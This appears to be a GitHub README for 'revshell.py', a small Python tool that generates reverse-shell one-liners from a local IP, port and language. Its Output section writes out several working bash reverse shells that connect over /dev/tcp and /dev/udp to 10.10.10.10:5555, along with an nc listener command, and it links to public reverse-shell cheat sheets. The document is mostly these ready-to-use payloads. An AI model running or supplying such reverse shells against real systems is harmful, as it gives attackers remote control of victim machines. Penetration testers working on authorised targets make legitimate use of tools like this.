### Revshell is a python script that will display multiple reverse shells in different programming langueges

<p>
    These shells were found online from different resources, they will be listed below
<p>

---

## Usage

```powershell
revshell.py -l [local IP] -p [port you want to listen on] -s [the language you want]
Example: revshell.py -l 10.10.10.10 -p 5555 -s bash 
```

## Output

```powershell
bash -i >& /dev/tcp/10.10.10.10/5555 0>&1

0<&196;exec 196<>/dev/tcp/10.10.10.10/5555; sh <&196 >&196 2>&196

/bin/bash -l > /dev/tcp/10.10.10.10/5555 0<&1 2>&1

You can use this for UPD

Victim host
sh -i >& /dev/udp/10.10.10.10/5555 0>&1

On your local machine
nc -u -lvp 5555
```
---

## Reverse shell's resources

[pentestmonkey]("https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet")

[Bernardo's Reverse Shell One-Liners]("https://bernardodamele.blogspot.com/2011/09/reverse-shells-one-liners.html")

[payloadsallthethings]("https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md")

---

<p>
    If you use this script and find it usefull then thank you and please let me know </br>
    if there is anything I can do to make it better. Also if you see something in the </br>
    code that could be done/written better please let me know as well, I am trying </br>
    to get better at my python coding.
</p>
